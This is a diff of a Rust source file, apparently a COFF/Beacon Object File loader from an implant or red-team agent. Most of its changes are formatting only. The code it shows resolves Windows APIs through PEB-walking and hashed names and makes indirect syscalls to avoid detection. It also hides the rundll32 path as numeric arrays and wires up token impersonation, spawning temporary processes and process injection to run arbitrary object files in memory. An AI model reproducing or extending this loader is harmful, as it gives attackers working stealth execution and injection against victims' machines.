@@ -45,8 +45,7 @@ use std::sync::atomic::{AtomicPtr, AtomicUsize, Ordering};
 // CreateThread/WaitForSingleObject removed — using NtCreateThreadEx/NtWaitForSingleObject indirect syscalls
 // CreateEventW removed — was unused
 use winapi::um::winnt::{
-    MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READONLY,
-    PAGE_READWRITE,
+    MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READONLY, PAGE_READWRITE,
 };
 
 // ── Constants ────────────────────────────────────────────────────────────────
@@ -246,11 +245,7 @@ struct BeaconData {
 }
 
 /// `BeaconDataParse(parser, buffer, size)` — initialize parser from packed args.
-unsafe extern "C" fn beacon_data_parse(
-    parser: *mut BeaconDataParser,
-    buffer: *mut u8,
-    size: i32,
-) {
+unsafe extern "C" fn beacon_data_parse(parser: *mut BeaconDataParser, buffer: *mut u8, size: i32) {
     if parser.is_null() {
         return;
     }
@@ -601,14 +596,18 @@ unsafe extern "C" fn beacon_use_token(token_handle: *mut c_void) -> i32 {
         return -1;
     }
     // Resolve ImpersonateLoggedOnUser from advapi32 via PEB-walk.
-    let advapi32 = match pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"advapi32.dll\0")) {
-        Some(h) => h,
-        None => {
-            log::warn!("[coff_loader] BeaconUseToken: failed to resolve advapi32.dll");
-            return -1;
-        }
-    };
-    let func_addr = match pe_resolve::get_proc_address_by_hash(advapi32, pe_resolve::hash_str(b"ImpersonateLoggedOnUser\0")) {
+    let advapi32 =
+        match pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"advapi32.dll\0")) {
+            Some(h) => h,
+            None => {
+                log::warn!("[coff_loader] BeaconUseToken: failed to resolve advapi32.dll");
+                return -1;
+            }
+        };
+    let func_addr = match pe_resolve::get_proc_address_by_hash(
+        advapi32,
+        pe_resolve::hash_str(b"ImpersonateLoggedOnUser\0"),
+    ) {
         Some(a) => a,
         None => {
             log::warn!("[coff_loader] BeaconUseToken: failed to resolve ImpersonateLoggedOnUser");
@@ -675,7 +674,10 @@ unsafe extern "C" fn beacon_spawn_temporary_process(
             return -1;
         }
     };
-    let cpw_addr = match pe_resolve::get_proc_address_by_hash(k32, pe_resolve::hash_str(b"CreateProcessW\0")) {
+    let cpw_addr = match pe_resolve::get_proc_address_by_hash(
+        k32,
+        pe_resolve::hash_str(b"CreateProcessW\0"),
+    ) {
         Some(a) => a,
         None => {
             log::warn!("[coff_loader] BeaconSpawnTemporaryProcess: CreateProcessW not found");
@@ -683,28 +685,28 @@ unsafe extern "C" fn beacon_spawn_temporary_process(
         }
     };
     type FnCreateProcessW = unsafe extern "system" fn(
-        *const u16,       // lpApplicationName
-        *mut u16,         // lpCommandLine (mutable per Win32)
-        *mut c_void,      // lpProcessAttributes
-        *mut c_void,      // lpThreadAttributes
-        i32,              // bInheritHandles
-        u32,              // dwCreationFlags
-        *mut c_void,      // lpEnvironment
-        *const u16,       // lpCurrentDirectory
-        *mut c_void,      // lpStartupInfo
-        *mut c_void,      // lpProcessInformation
+        *const u16,  // lpApplicationName
+        *mut u16,    // lpCommandLine (mutable per Win32)
+        *mut c_void, // lpProcessAttributes
+        *mut c_void, // lpThreadAttributes
+        i32,         // bInheritHandles
+        u32,         // dwCreationFlags
+        *mut c_void, // lpEnvironment
+        *const u16,  // lpCurrentDirectory
+        *mut c_void, // lpStartupInfo
+        *mut c_void, // lpProcessInformation
     ) -> i32;
     let create_process: FnCreateProcessW = std::mem::transmute(cpw_addr);
 
     // Choose spawn-to binary path as UTF-16LE with null terminator.
     // C:\Windows\SysWOW64\rundll32.exe (x86) or C:\Windows\System32\rundll32.exe (x64).
     const RUNDLL32_X64: &[u16] = &[
-        67, 58, 92, 87, 105, 110, 100, 111, 119, 115, 92, 83, 121, 115, 116, 101,
-        109, 51, 50, 92, 114, 117, 110, 100, 108, 108, 51, 50, 46, 101, 120, 101, 0,
+        67, 58, 92, 87, 105, 110, 100, 111, 119, 115, 92, 83, 121, 115, 116, 101, 109, 51, 50, 92,
+        114, 117, 110, 100, 108, 108, 51, 50, 46, 101, 120, 101, 0,
     ]; // "C:\Windows\System32\rundll32.exe\0"
     const RUNDLL32_X86: &[u16] = &[
-        67, 58, 92, 87, 105, 110, 100, 111, 119, 115, 92, 83, 121, 115, 87, 79, 87,
-        54, 52, 92, 114, 117, 110, 100, 108, 108, 51, 50, 46, 101, 120, 101, 0,
+        67, 58, 92, 87, 105, 110, 100, 111, 119, 115, 92, 83, 121, 115, 87, 79, 87, 54, 52, 92,
+        114, 117, 110, 100, 108, 108, 51, 50, 46, 101, 120, 101, 0,
     ]; // "C:\Windows\SysWOW64\rundll32.exe\0"
     let exe: &[u16] = if x86 != 0 { RUNDLL32_X86 } else { RUNDLL32_X64 };
 
@@ -736,8 +738,10 @@ unsafe extern "C" fn beacon_spawn_temporary_process(
     }
 
     // Extract handles from PROCESS_INFORMATION.
-    let h_process = usize::from_ne_bytes(proc_info[0..8].try_into().unwrap_or([0u8; 8])) as *mut c_void;
-    let _h_thread = usize::from_ne_bytes(proc_info[8..16].try_into().unwrap_or([0u8; 8])) as *mut c_void;
+    let h_process =
+        usize::from_ne_bytes(proc_info[0..8].try_into().unwrap_or([0u8; 8])) as *mut c_void;
+    let _h_thread =
+        usize::from_ne_bytes(proc_info[8..16].try_into().unwrap_or([0u8; 8])) as *mut c_void;
     let pid = u32::from_ne_bytes(proc_info[16..20].try_into().unwrap_or([0u8; 4]));
 
     // Close the thread handle — we only need the process handle.
@@ -1024,9 +1028,15 @@ fn build_internal_symbols() -> Vec<SymbolEntry> {
     sym!("BeaconUseToken", beacon_use_token);
     sym!("BeaconRevertToken", beacon_revert_token);
     sym!("BeaconGetSpawnTo", beacon_get_spawn_to);
-    sym!("BeaconSpawnTemporaryProcess", beacon_spawn_temporary_process);
+    sym!(
+        "BeaconSpawnTemporaryProcess",
+        beacon_spawn_temporary_process
+    );
     sym!("BeaconInjectProcess", beacon_inject_process);
-    sym!("BeaconInjectTemporaryProcess", beacon_inject_temporary_process);
+    sym!(
+        "BeaconInjectTemporaryProcess",
+        beacon_inject_temporary_process
+    );
     sym!("BeaconCleanupProcess", beacon_cleanup_process);
     sym!("toNative", to_native);
 
@@ -1060,19 +1070,20 @@ unsafe fn resolve_dynamic_symbol(name: &str) -> Option<*const c_void> {
     let dll_name_wide: Vec<u16> = dll_name.encode_utf16().chain(std::iter::once(0)).collect();
 
     // Try to find the module already loaded in the PEB.
-    let module = match pe_resolve::get_module_handle_by_hash(
-        pe_resolve::hash_wstr(&dll_name_wide[..dll_name_wide.len() - 1]),
-    ) {
+    let module = match pe_resolve::get_module_handle_by_hash(pe_resolve::hash_wstr(
+        &dll_name_wide[..dll_name_wide.len() - 1],
+    )) {
         Some(base) => base as *mut c_void,
         None => {
             // Module not loaded yet — resolve LoadLibraryW via pe_resolve and load it.
-            let kernel32 = match pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL) {
-                Some(b) => b,
-                None => {
-                    log::warn!("[coff_loader] cannot resolve kernel32");
-                    return None;
-                }
-            };
+            let kernel32 =
+                match pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL) {
+                    Some(b) => b,
+                    None => {
+                        log::warn!("[coff_loader] cannot resolve kernel32");
+                        return None;
+                    }
+                };
             let llw_addr = match pe_resolve::get_proc_address_by_hash(
                 kernel32,
                 pe_resolve::hash_str(b"LoadLibraryW\0"),
@@ -1111,11 +1122,7 @@ unsafe fn resolve_dynamic_symbol(name: &str) -> Option<*const c_void> {
         }
     };
 
-    log::debug!(
-        "[coff_loader] resolved {} at {:#x}",
-        name,
-        proc as usize
-    );
+    log::debug!("[coff_loader] resolved {} at {:#x}", name, proc as usize);
     Some(proc)
 }
 
@@ -1162,11 +1169,7 @@ fn coff_symbol_name(symbol: &CoffSymbol, string_table: &[u8]) -> String {
         }
     } else {
         // Inline 8-byte name (may not be null-terminated).
-        let end = symbol
-            .name
-            .iter()
-            .position(|&b| b == 0)
-            .unwrap_or(8);
+        let end = symbol.name.iter().position(|&b| b == 0).unwrap_or(8);
         String::from_utf8_lossy(&symbol.name[..end]).to_string()
     }
 }
@@ -1220,7 +1223,11 @@ pub unsafe fn execute_bof(
         ));
     }
     if args.len() > MAX_ARGS {
-        return Err(format!("too many arguments: {} (max {})", args.len(), MAX_ARGS));
+        return Err(format!(
+            "too many arguments: {} (max {})",
+            args.len(),
+            MAX_ARGS
+        ));
     }
 
     // ── Parse COFF header ───────────────────────────────────────────────
@@ -1251,7 +1258,8 @@ pub unsafe fn execute_bof(
     );
 
     // ── Parse section headers ───────────────────────────────────────────
-    let section_offset = std::mem::size_of::<CoffHeader>() + header.size_of_optional_header as usize;
+    let section_offset =
+        std::mem::size_of::<CoffHeader>() + header.size_of_optional_header as usize;
     let sections: Vec<CoffSection> = {
         let mut secs = Vec::with_capacity(header.number_of_sections as usize);
         for i in 0..header.number_of_sections {
@@ -1262,7 +1270,7 @@ pub unsafe fn execute_bof(
             }
             // P2-28: read_unaligned — section data may not be naturally aligned.
             secs.push(std::ptr::read_unaligned(
-                coff_bytes.as_ptr().add(off) as *const CoffSection,
+                coff_bytes.as_ptr().add(off) as *const CoffSection
             ));
         }
         secs
@@ -1282,7 +1290,7 @@ pub unsafe fn execute_bof(
             }
             // P2-28: read_unaligned — symbol data may not be naturally aligned.
             syms.push(std::ptr::read_unaligned(
-                coff_bytes.as_ptr().add(off) as *const CoffSymbol,
+                coff_bytes.as_ptr().add(off) as *const CoffSymbol
             ));
         }
         syms
@@ -1333,18 +1341,21 @@ pub unsafe fn execute_bof(
     let mut region_size = total_size;
     let alloc_status = crate::syscall!(
         "NtAllocateVirtualMemory",
-        (-1isize) as u64,                    // NtCurrentProcess()
-        &mut base_ptr as *mut _ as u64,     // BaseAddress (in/out)
-        0u64,                                 // ZeroBits
-        &mut region_size as *mut _ as u64,  // RegionSize (in/out)
-        (MEM_COMMIT | MEM_RESERVE) as u64,  // AllocationType
-        PAGE_READWRITE as u64,              // PAGE_READWRITE — flipped to per-section protections after relocations
+        (-1isize) as u64,                  // NtCurrentProcess()
+        &mut base_ptr as *mut _ as u64,    // BaseAddress (in/out)
+        0u64,                              // ZeroBits
+        &mut region_size as *mut _ as u64, // RegionSize (in/out)
+        (MEM_COMMIT | MEM_RESERVE) as u64, // AllocationType
+        PAGE_READWRITE as u64, // PAGE_READWRITE — flipped to per-section protections after relocations
     );
     if alloc_status.is_err() || alloc_status.unwrap() < 0 || base_ptr == 0 {
         return Err("NtAllocateVirtualMemory failed for COFF memory".to_string());
     }
     let base = base_ptr as *mut c_void;
-    log::info!("[coff_loader] allocated COFF memory at {:#x}", base as usize);
+    log::info!(
+        "[coff_loader] allocated COFF memory at {:#x}",
+        base as usize
+    );
 
     // Zero the entire region.
     std::ptr::write_bytes(base as *mut u8, 0, total_size);
@@ -1357,11 +1368,7 @@ pub unsafe fn execute_bof(
         let raw_offset = section.pointer_to_raw_data as usize;
 
         if raw_size > 0 && raw_offset + raw_size <= coff_bytes.len() {
-            std::ptr::copy_nonoverlapping(
-                coff_bytes.as_ptr().add(raw_offset),
-                dst,
-                raw_size,
-            );
+            std::ptr::copy_nonoverlapping(coff_bytes.as_ptr().add(raw_offset), dst, raw_size);
         }
     }
 
@@ -1377,7 +1384,8 @@ pub unsafe fn execute_bof(
             if roff + reloc_size > coff_bytes.len() {
                 continue;
             }
-            let reloc = std::ptr::read_unaligned(coff_bytes.as_ptr().add(roff) as *const CoffRelocation);
+            let reloc =
+                std::ptr::read_unaligned(coff_bytes.as_ptr().add(roff) as *const CoffRelocation);
             let sym_idx = reloc.symbol_table_index as usize;
             if sym_idx >= symbols.len() {
                 log::warn!(
@@ -1408,10 +1416,7 @@ pub unsafe fn execute_bof(
                 match resolve_symbol(&sym_name, &internal_symbols) {
                     Some(addr) => addr as usize,
                     None => {
-                        log::warn!(
-                            "[coff_loader] unresolved external symbol: '{}'",
-                            sym_name
-                        );
+                        log::warn!("[coff_loader] unresolved external symbol: '{}'", sym_name);
                         continue;
                     }
                 }
@@ -1438,7 +1443,9 @@ pub unsafe fn execute_bof(
             if write_size == 0 {
                 log::warn!(
                     "[coff_loader] unsupported relocation type {} for symbol '{}' at offset {:#x}",
-                    reloc_type, sym_name, roff
+                    reloc_type,
+                    sym_name,
+                    roff
                 );
                 continue;
             }
@@ -1529,10 +1536,10 @@ pub unsafe fn execute_bof(
         let is_executable = section.characteristics & IMAGE_SCN_MEM_EXECUTE != 0;
         let is_writable = section.characteristics & IMAGE_SCN_MEM_WRITE != 0;
         let prot = match (is_executable, is_writable) {
-            (true,  false) => PAGE_EXECUTE_READ,     // RX — most .text sections
-            (true,  true)  => 0x40u32,               // RWX — unavoidable for RW+RX sections
-            (false, true)  => PAGE_READWRITE,         // RW — .data/.bss sections
-            (false, false) => PAGE_READONLY,                // RO — .rdata sections
+            (true, false) => PAGE_EXECUTE_READ, // RX — most .text sections
+            (true, true) => 0x40u32,            // RWX — unavoidable for RW+RX sections
+            (false, true) => PAGE_READWRITE,    // RW — .data/.bss sections
+            (false, false) => PAGE_READONLY,    // RO — .rdata sections
         };
 
         let mut base_addr = (base as usize + offset) as *mut c_void;
@@ -1540,11 +1547,11 @@ pub unsafe fn execute_bof(
         let mut old_prot: u32 = 0;
         let _ = crate::syscall!(
             "NtProtectVirtualMemory",
-            (-1isize) as u64,                        // NtCurrentProcess()
-            &mut base_addr as *mut _ as u64,         // BaseAddress (in/out)
-            &mut sec_size as *mut _ as u64,          // RegionSize (in/out)
-            prot as u64,                               // NewProtect
-            &mut old_prot as *mut u32 as u64,         // OldProtect
+            (-1isize) as u64,                 // NtCurrentProcess()
+            &mut base_addr as *mut _ as u64,  // BaseAddress (in/out)
+            &mut sec_size as *mut _ as u64,   // RegionSize (in/out)
+            prot as u64,                      // NewProtect
+            &mut old_prot as *mut u32 as u64, // OldProtect
         );
     }
 
@@ -1558,9 +1565,9 @@ pub unsafe fn execute_bof(
     {
         let flush_status = crate::syscall!(
             "NtFlushInstructionCache",
-            (-1isize) as u64,             // NtCurrentProcess()
-            base as usize as u64,         // COFF base address
-            total_size as u64,            // total mapped size
+            (-1isize) as u64,     // NtCurrentProcess()
+            base as usize as u64, // COFF base address
+            total_size as u64,    // total mapped size
         );
         match flush_status {
             Ok(s) if s < 0 => {
@@ -1647,11 +1654,7 @@ pub unsafe fn execute_bof(
             return Err("NtAllocateVirtualMemory failed for BOF args".to_string());
         }
         let arg_buf = arg_buf_ptr as *mut c_void;
-        std::ptr::copy_nonoverlapping(
-            packed_args.as_ptr(),
-            arg_buf as *mut u8,
-            packed_args.len(),
-        );
+        std::ptr::copy_nonoverlapping(packed_args.as_ptr(), arg_buf as *mut u8, packed_args.len());
         (arg_buf as *mut u8, packed_args.len() as i32)
     };
 
@@ -1667,16 +1670,16 @@ pub unsafe fn execute_bof(
     let thread_status = crate::syscall!(
         "NtCreateThreadEx",
         &mut thread_handle_raw as *mut _ as u64, // ThreadHandle
-        THREAD_WAIT_ACCESS,                              // minimal thread access
-        std::ptr::null::<u64>() as u64,            // ObjectAttributes
-        (-1isize) as u64,                          // NtCurrentProcess()
-        go_addr as u64,                            // StartRoutine
-        args_ptr as *mut c_void as u64,            // Argument
-        0u64,                                      // CreateSuspended
-        0u64,                                      // ZeroBits
-        0u64,                                      // StackSize
-        0u64,                                      // MaxStackSize
-        std::ptr::null::<u64>() as u64,            // AttributeSet
+        THREAD_WAIT_ACCESS,                      // minimal thread access
+        std::ptr::null::<u64>() as u64,          // ObjectAttributes
+        (-1isize) as u64,                        // NtCurrentProcess()
+        go_addr as u64,                          // StartRoutine
+        args_ptr as *mut c_void as u64,          // Argument
+        0u64,                                    // CreateSuspended
+        0u64,                                    // ZeroBits
+        0u64,                                    // StackSize
+        0u64,                                    // MaxStackSize
+        std::ptr::null::<u64>() as u64,          // AttributeSet
     );
 
     if thread_status.is_err() || thread_status.unwrap() < 0 || thread_handle_raw == 0 {
